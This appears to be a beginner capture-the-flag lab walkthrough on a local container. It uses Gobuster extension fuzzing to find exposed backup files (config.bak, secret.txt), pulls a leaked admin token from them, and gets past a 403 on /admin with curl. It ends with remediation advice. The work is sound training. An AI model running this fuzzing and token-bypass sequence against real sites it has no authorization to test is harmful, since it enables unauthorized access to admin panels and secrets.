# Level 2: Extension Fuzzing & Sensitive File Exposure

## Metadata
- **Track**: Offensive Security
- **Difficulty**: Beginner
- **Category**: File Extension Fuzzing, Sensitive Data Exposure, Authorization Bypass

---

## Overview

Following an initial discovery, targets often secure endpoints behind authentication, returning `403 Forbidden` responses. However, development workflows often produce unlinked artifacts—such as configuration backups, notes, and database dumps (`.bak`, `.txt`, `.json`, `.old`)—stored within the web document root. 

This exercise demonstrates how extension fuzzing discovers these forgotten files and uses leaked credentials to bypass access controls.

---

## Objectives

1. Deploy the Level 2 container target.
2. Confirm the `/admin` portal returns `403 Forbidden`.
3. Use Gobuster's `-x` flag to fuzz for common file extensions.
4. Extract leaked authorization credentials from exposed backup files.
5. Bypass the authorization check on `/admin` to retrieve the flag.

---

## Deployment

From the repository root:
```bash
./start-lab.sh 2
```

---

## Walkthrough

### Step 1: Probe the Endpoint
Attempt direct access to the administrative dashboard:
```bash
curl -i http://127.0.0.1:8080/admin
```
The server responds with `HTTP 403 Forbidden`, indicating that authentication is required.

### Step 2: Extension Fuzzing
Execute Gobuster using the bundled wordlist and append common backup and configuration extensions:
```bash
gobuster dir -u http://127.0.0.1:8080 -w wordlists/common.txt -x bak,txt,json
```

Identified endpoints returning `HTTP 200`:
- `/config.bak`
- `/secret.txt`
- `/notes.txt`

### Step 3: Credential Extraction
Inspect the contents of the discovered files:
```bash
curl -s http://127.0.0.1:8080/config.bak
curl -s http://127.0.0.1:8080/secret.txt
```
The leaked developer notes reveal the emergency token `master_chef_token_2026`.

### Step 4: Authorization Bypass
Authenticate against the protected endpoint:

- **Via URL Parameter:**
  ```bash
  curl -s "http://127.0.0.1:8080/admin?token=master_chef_token_2026"
  ```

- **Via HTTP Header:**
  ```bash
  curl -s -H "X-Admin-Token: master_chef_token_2026" http://127.0.0.1:8080/admin
  ```

---

## Summary and Remediation

- **Root Cause**: Sensitive configuration and backup files left exposed in public web directories.
- **Remediation**:
  1. Restrict deployment pipelines to exclude development notes and backups.
  2. Configure web servers (e.g., Nginx, Apache) to explicitly reject requests for sensitive extensions (`.bak`, `.conf`, `.sql`, `.env`).
  3. Avoid hardcoding administrative bypass tokens in source or configuration files.

---

## Teardown
```bash
./stop-lab.sh
```
